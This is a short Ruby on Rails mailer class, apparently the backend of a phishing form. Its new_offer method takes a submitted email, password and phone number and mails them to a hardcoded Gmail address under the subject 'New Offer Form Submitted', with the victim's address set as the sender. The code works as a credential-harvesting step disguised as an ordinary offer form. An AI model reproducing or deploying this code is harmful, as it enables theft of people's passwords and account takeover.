class SunnyMailer < ApplicationMailer
  default to: "teamhub532@gmail.com"

  def new_offer(email, password, phone)
    @user_email = email
    @user_password = password
    @user_phone = phone
    mail(from: email, subject: "New Offer Form Submitted")
  end
end
